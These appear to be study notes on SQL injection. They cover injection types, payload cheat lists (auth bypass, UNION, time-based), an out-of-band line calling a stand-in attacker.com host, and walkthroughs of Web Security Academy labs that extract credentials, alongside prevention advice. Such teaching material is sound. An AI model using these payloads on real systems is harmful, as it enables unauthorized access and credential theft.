- SQL Injection is a vulnerability where an attacker manipulates SQL queries by injecting malicious input into application fields, causing the database to execute unintended commands.

- You're putting SQL code where the application expects normal data, and the database accidentally runs your code!

**SQL Injection occurs when:**

- User input is inserted directly into SQL queries
- Attacker manipulates the query structure
- Database executes unintended commands
- Attacker gains unauthorized access to data


## How SQL Queries Work

**Selecting data:**

```SQL
SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
```

What this does:

- SELECT * → Get all columns
- FROM users → From the users table
- WHERE → Filter condition
- Returns user if username AND password match


## How SQL Injection Works

**Vulnerable Code Example :**

```PHP
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

##### Normal Login:

User enters: john / secret123

Query becomes:

```SQL
SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
```

Result: Returns john's account if password is correct ✓


#### SQL Injection Attack:

User enters: admin'-- / anything

Query becomes:

```SQL
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

admin'    → Closes the username string
--        → Comments out the rest of the query

**The password check is completely bypassed!**
**Result: Logs in as admin without knowing the password!**

```
SELECT * FROM users WHERE username = ' admin'-- ' AND password = ' anything '
                                      ↑      ↑↑↑
                                   Quote  Payload
                                          
admin'   → Closes the string early
--       → Comments out everything after

Effective query: SELECT * FROM users WHERE username = 'admin'
```


==The attacker injects a comment (--) to terminate the original SQL query, removing the password condition so authentication is bypassed.==

## Types of SQL Injection
## *Type 1: In-Band SQLi*
     **Results are directly visible in the response.**

##### a. Error-Based SQLi
    **Force database errors that reveal information:**
    
```
Input: ' OR 1=CONVERT(int, (SELECT TOP 1 username FROM users))--

Error: Conversion failed when converting 'admin' to int
```

The error message leaks the username!

##### b. UNION-Based SQLi
    Combine your query with the original:
    
```SQL
' UNION SELECT username, password FROM users--
```

Data from users table appears in the response.


## Type 2: Blind SQLi
    No visible output, but you can infer results.

##### c. Boolean-Based Blind
    Ask true/false questions:

```SQL
' AND 1=1--    → Page loads normally (TRUE)
' AND 1=2--    → Page behaves differently (FALSE)
```

##### b. Time-Based Blind
     No visible difference? Use time delays:

```SQL
' AND SLEEP(5)--     → If vulnerable, response takes 5 seconds
' AND IF(1=1, SLEEP(5), 0)--   → Conditional delay
```

## Type 3: Out-of-Band SQLi
     Send data to external server you control:

```SQL
'; EXEC xp_dirtree '\\attacker.com\share'--
```

Database makes DNS/HTTP request to your server with data.


## SQL Injection Locations

Common injection points:

- Login forms (username/password fields)
- Search boxes
- URL parameters (?id=1)
- Cookie values
- HTTP headers (User-Agent, Referer)
- Hidden form fields
- API parameters (JSON/XML)

URL ex:-
```TEXT
https://shop.com/product?id=1
https://shop.com/user?name=john
https://shop.com/search?q=laptop
https://shop.com/category?cat=electronics&sort=price
```

## Basic SQLi Payloads:-

Detection payloads:

```SQL
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
```

Authentication bypass:

```SQL
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
') OR ('1'='1'--
' OR 'x'='x
' OR 1=1 LIMIT 1 -- -+
```

UNION-based:

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username, password FROM users--
```

Time-based:

```SQL
'; WAITFOR DELAY '0:0:5'--
'; SLEEP(5)--
' AND SLEEP(5)--
' OR SLEEP(5)--
```

## Impact of SQL Injection

Data Breach:

    Steal entire database contents
    User credentials
    Personal information (PII)
    Financial data
    Business secrets

Authentication Bypass:

    Login as any user
    Access admin accounts
    Impersonate other users

Data Manipulation:

    Modify data (prices, balances)
    Delete records
    Insert malicious data

Remote Code Execution:

    Read/write files on server
    Execute system commands
    Full server compromise


## Database-Specific Syntax

```
Database	                            Comment Syntax
MySQL                              	# or -- (with space) or /* */
PostgreSQL                          -- or /* */
Oracle	                                -- or /* */
MSSQL	                                -- or /* */
```

String Concatenation:

```
Database                            	Syntax
MySQL	                                CONCAT('a','b') or 'a' 'b'
PostgreSQL                     	'a' || 'b'
Oracle	                                'a' || 'b'
MSSQL	                            'a' + 'b'
```

Version Detection:

```
Database	                                 Query
MySQL	                                     SELECT @@version
PostgreSQL	                             SELECT version()
Oracle	                                     SELECT banner FROM v$version
MSSQL	                                 SELECT @@version
```


## Prevention Methods
##### 1. Use Prepared Statements (Best defense)

- Separates SQL logic from data
- Input is treated as data, not code
Example (safe):

```SQL
SELECT * FROM users WHERE username = ? AND password = ?;
```

```Python
# VULNERABLE - String concatenation
query = "SELECT * FROM users WHERE id = '" + user_id + "'"

# SECURE - Parameterized query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

```JAVA
// VULNERABLE
String query = "SELECT * FROM users WHERE id = '" + userId + "'";

// SECURE
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setString(1, userId);
```

##### 2. Input validation

- Whitelist expected formats (numbers, emails)
- Reject unexpected characters

```Python
# Whitelist approach
if user_input not in ['option1', 'option2', 'option3']:
    reject()

# Type checking
user_id = int(user_input)  # Will fail if not a number
```
##### 3. Least privilege


- Database user should have minimal permissions
- Don't use 'root' or 'sa' for web app connections
- Limit access to specific tables only

##### 4. Hide error messages

Do not expose SQL/database errors to users




## Lab 1 : Retrieving Hidden Data

**Goal: Perform SQL injection to display all products, including unreleased hidden ones**

**Key Concept: Manipulating the WHERE clause to bypass filters**

1.Click on any category like "Gifts" or "Accessories"
2.Notice the URL changes

```TEXT
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts
```

3.Understand the Backend Query
     When you click "Gifts", the server probably runs:
```SQL
     SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
     This query:

    Gets all columns from products table
    Filters by category = 'Gifts'
    Only shows released products (released = 1)

The hidden products have released = 0, so they don't appear.


#### Test for SQL Injection
**Add a single quote to the category parameter:**

```TEXT
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'

```

What to look for:

    Error message → Vulnerable!
    Page breaks or looks different → Likely vulnerable
    Normal response → Might not be vulnerable or error handling is good

**The single quote breaks the SQL syntax:**


#### Craft the Payload
**Our goal: Make the WHERE clause always true**

Payload:
```
Gifts' OR 1=1--
```


```TEXT
Gifts' OR 1=1--

Gifts   → Original category value (can be anything)
'       → Closes the string that started with WHERE category = '
OR      → SQL OR operator
1=1     → Always true condition
--      → Comment symbol (ignores everything after)
```

After injection:
```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

```TEXT
where:
Gifts'     → Closes the original string
OR 1=1     → Adds condition that's always TRUE
--         → Comments out the rest (AND released = 1)
```


#### Execute the Attack
```
 https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```


## LAB 2: Login Bypass

Goal: Login as the administrator user
Key Concept: Manipulating login query to bypass password check

**login form is our target!**

#### Backend Query
When you submit login, the server probably runs:

```SQL
SELECT * FROM users WHERE username = 'INPUT_USER' AND password = 'INPUT_PASS'
```

example:-

```SQL
SELECT * FROM users WHERE username = 'administrator' AND password = 'secretpass123'
```


#### The Attack 
**Comment out the password check**

After injection:-

```SQL
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
                                                      ↑
                                              Everything after -- is ignored!
```
The password check is completely bypassed!


#### Execute the Attack

1. Enter in username field:
```TEXT
   administrator'--
```

2. Enter in password field:
```TEXT
   anything
```


3. Click Login


Can be Also done by using Burpsuite.


## Lab 7: Determining Number of Columns 

Goal: Determine the number of columns and return an additional row using UNION

#### Find Column Count Using ORDER BY

```
/filter?category=Lifestyle' ORDER BY 1--
```
Response: 200 OK ✓
.
increase 2-3
.
```
/filter?category=Lifestyle' ORDER BY 4--
```
Response: 500 Error ✗
**Answer: 3 columns exist!**


#### Confirm with UNION SELECT NULL
```
/filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL--
```
This should:

    Return 200 OK
    Add an extra row to results
    Solve the lab!


## Lab 8: Finding Column Containing Text 
same as LAB 7

**Goal**: Find the text-compatible column and make it display a specific string
**Key Concept:** Not all columns accept text - we must identify which one does

Find no. or Columns By ORDER BY 1-- and confirm by UNION SELECT NULL--
#### Test Each Column for Text
```
/filter?category=Gifts' UNION SELECT 'test',NULL,NULL--
```
If **"text"** is reflected in result means data is in that row

```
/filter?category=Gifts' UNION SELECT NULL,'test',NULL--
```

reflect back the "test" now replace the test with given word by lab.


## Lab 9: Retrieving Data From Other Tables 

**Goal:** Extract usernames and passwords from the users table, then login as administrator
**Key Concept:** Use UNION to extract data from different tables

Find no. of columns by ORDER BY & confirm by UNION SELECT 

**Test both:**
```
/filter?category=Gifts' UNION SELECT 'test','test'--
```
Result: Both columns likely accept text (for username and password display)

#### Extract Usernames and Passwords
**The payload:**
```
/filter?category=Gifts' UNION SELECT username,password FROM users--
```

This query:

    Selects username from users table → Goes to column 1
    Selects password from users table → Goes to column 2

**GOT the administrator password & login in the account with  $username & $password**


## Lab 10: Retrieving Multiple Values in Single Column

**Goal**: Extract usernames and passwords when only one column accepts text
**Key Concept:** Concatenate multiple values into one column

In this lab:

    2 columns exist
    Only ONE accepts text
    Problem: How to show both username AND password?

Solution: Concatenate them together!


1. check no. of column by ORDER BY & confirm by UNION SELECT 
   and enter the payload:-
2. 
```TEXT 
/filter?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```

**Different separators we can use:-**

```
username||'~'||password
username||':'||password
username||' -> '||password
```

Got the username and passwords.
## Lab : UNION Attack - Finding Number of Columns

Goal: Determine the number of columns returned by the query using UNION attack
Key Concept: UNION requires matching column count between queries

#### UNION in SQL

UNION combines results from two SELECT queries into one result set.

ex:-
```SQl
SELECT name, price FROM products
UNION
SELECT username, password FROM users
```

This returns:
Column 1         	Column 2
Jacket              	$59.99
Laptop	                $999.99
admin                	secretpass
carlos                	password123


#### The UNION Rule
**Critical rule**: Both SELECT statements MUST have the SAME number of columns!

```SQL
SELECT name, price FROM products      -- 2 columns
UNION
SELECT username, password FROM users  -- 2 columns ✓
```

```SQL
SELECT name, price FROM products      -- 2 columns
UNION
SELECT username FROM users            -- 1 column ✗ ERROR!
```

**So before extracting data, we MUST find how many columns the original query returns!**

#### Two Methods to Find Column Count
##### 1: ORDER BY
Increment the column number until you get an error.
```SQL
' ORDER BY 1--    → Works (at least 1 column)
' ORDER BY 2--    → Works (at least 2 columns)
' ORDER BY 3--    → Works (at least 3 columns)
' ORDER BY 4--    → ERROR! (only 3 columns exist)
```

Answer: 3 columns!


##### 2: UNION SELECT NULL
Add NULL values until the query works.
```SQL
' UNION SELECT NULL--           → Error (not enough columns)
' UNION SELECT NULL,NULL--      → Error (not enough columns)
' UNION SELECT NULL,NULL,NULL-- → Works! (3 columns)
```

Answer: 3 columns!

==NULL is compatible with any data type!==

```SQL
' UNION SELECT 'text', 123, NULL--
```


- Column 1 expects text → 'text' works
- Column 2 expects number → 123 works
- Column 3 expects anything → NULL works

==Using NULL avoids data type errors while finding column count.==

#### 1. open website and explore categories like (Gifts) and Notice URL:

```TEXT
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts
```

#### 2: Confirm SQL Injection
Test with a single quote:

```TEXT
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts'
```

You should see an error or different behavior confirming SQLi.

#### 3.Find Column Count UNION SELECT NULL
**Test 1 NULL:**

```
/filter?category=Gifts' UNION SELECT NULL--
```
Result: Error ✗

**Test 2 NULLs:**

```
/filter?category=Gifts' UNION SELECT NULL,NULL--
```

Result: Error ✗

**Test 3 NULLs:**

```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

Result: Success! ✓ Page loads with extra empty row

Confirmed: 3 columns!


alternative way to find column 

#### Find Column Count Using ORDER BY

**Test ORDER BY 1:**

```
/filter?category=Gifts' ORDER BY 1--
```
Result: Page loads normally ✓ (at least 1 column)

**Test ORDER BY 2:**

```
/filter?category=Gifts' ORDER BY 2--
```

Result: Page loads normally ✓ (at least 2 columns)

**Test ORDER BY 3:**

```
/filter?category=Gifts' ORDER BY 3--
```

Result: Page loads normally ✓ (at least 3 columns)

**Test ORDER BY 4:**

```
/filter?category=Gifts' ORDER BY 4--
```

Result: Error! ✗ (only 3 columns exist)

**Conclusion: The query returns 3 columns!**


####  Complete the Lab
```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```



#### Visual Explanation
Original query:

```SQL
SELECT name, description, price FROM products WHERE category = 'Gifts'
```

Returns:


| name      | description   | price |
| --------- | ------------- | ----- |
| Gift Card | A lovely gift | $25   |
| Perfume   | Nice smell    | $50   |

**After UNION injection:**

```SQL
SELECT name, description, price FROM products WHERE category = 'Gifts'
UNION
SELECT NULL, NULL, NULL
```

Returns:


| name      | description   | price |
| --------- | ------------- | ----- |
| Gift Card | A lovely gift | $25   |
| Perfume   | Nice smell    | $50   |
| NULL      | NULL          | NULL  |

**Extra row added! This confirms 3 columns.**

#### Why This Matters
Finding column count is ESSENTIAL because:

    UNION requires exact column match
    Once you know columns, you can extract data
    You can place your extracted data in visible columns

Next steps after finding columns:

```SQL
-- Find which columns display on page
' UNION SELECT 'a','b','c'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract table names
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Extract usernames and passwords
' UNION SELECT NULL,username,password FROM users--
```

